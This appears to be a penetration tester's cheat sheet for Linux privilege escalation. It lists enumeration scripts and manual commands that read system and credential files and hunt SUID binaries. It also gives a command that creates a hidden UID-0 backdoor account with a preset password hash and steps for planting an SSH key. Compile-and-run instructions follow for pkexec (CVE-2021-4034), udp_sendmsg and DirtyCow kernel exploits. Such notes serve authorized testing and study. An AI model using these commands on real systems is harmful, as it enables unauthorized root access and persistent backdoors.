# Privilege Escalation

## Scripts

* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
* linux-exploit-suggester.py
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
* [https://github.com/TH3xACE/SUDO\_KILLER](https://github.com/TH3xACE/SUDO\_KILLER)
* [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

## Articles

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
* [https://blog.thehackingnomad.com/cheat-sheet-series/privesc-linux](https://blog.thehackingnomad.com/cheat-sheet-series/privesc-linux)
* [https://github.com/C0nd4/OSCP-Priv-Esc](https://github.com/C0nd4/OSCP-Priv-Esc)

## Manual

```
# Current user and hostname
whoami
id
hostname

# Existing users
cat /etc/passwd

# OS version & architecture
cat /etc/issue
cat /etc/*-release
uname -a
arch

# Processes & services
ps aux

# Networking info
ip a
/sbin/route
ss -anp

# Firewall
cat /etc/iptables
# check for iptables-save and iptables-restore commands. See if the dump file has weak permissions

# Scheduled tasks
# verify cron files permissions and content, if possible
ls -lah /etc/cron*
cat /etc/crontab
grep "CRON" /var/log/cron.log

# Installed applications
dpkg -l
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null

# Check for readable/writable files & directories
find / -writable -type d 2>/dev/null

# Enumerate unmounted disks
cat /etc/fstab
mount
/bin/lsblk

# List device drivers & kernel modules
lsmod
/sbin/modinfo <name>

# Check for binaries that autoelevate
# search for binaries with SUID bit
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -002 -type f -not -path "/proc/*" Â 2>/dev/null

# Check SSH config
cat /etc/ssh/sshd_config

# Check various places for stuff
/var
/opt
/usr/local/src
/usr/src
/home
```

## Create Admin User

```
# mkpasswd -5 'slysandwich' saltsalt
# $1$saltsalt$ZKH1gzt6khxuPmJvab9iy0


/usr/sbin/useradd -s /bin/bash -o -u 0 -g 0 -d /tmp -p \$1\$saltsalt\$ZKH1gzt6khxuPmJvab9iy0 slysandwich
```

## Add SSH Key

Create SSH key:

```
ssh-keygen -t rsa -b 2048 -f ./user.key
```

Add the public key inside the authorized keys (\~/.ssh/authorized\_keys).

## Exploits

### pkexec (CVE-2021-4034)

Source: [https://github.com/berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034)

### **udp\_sendmsg\_32bit** (CVE-2009-2698)

Source: [https://github.com/lucyoa/kernel-exploits/blob/master/udp\_sendmsg\_32bit/udp\_sendmsg\_32bit.c](https://github.com/lucyoa/kernel-exploits/blob/master/udp\_sendmsg\_32bit/udp\_sendmsg\_32bit.c)

Compilation:

```
gcc -o us udp_sendmsg_32bit.c -m32 -Wl,--hash-style=both
```

Usage:

```
chmod +x us && ./us
```

### DirtyCow2

Source: EDB 40839

Compilation:

```
gcc -pthread 40839.c -o dirty -lcrypt
```

Usage:

```
# Backup passwd
cp /etc/passwd /tmp/passwd.bak

# Execute exploit
./dirty
```
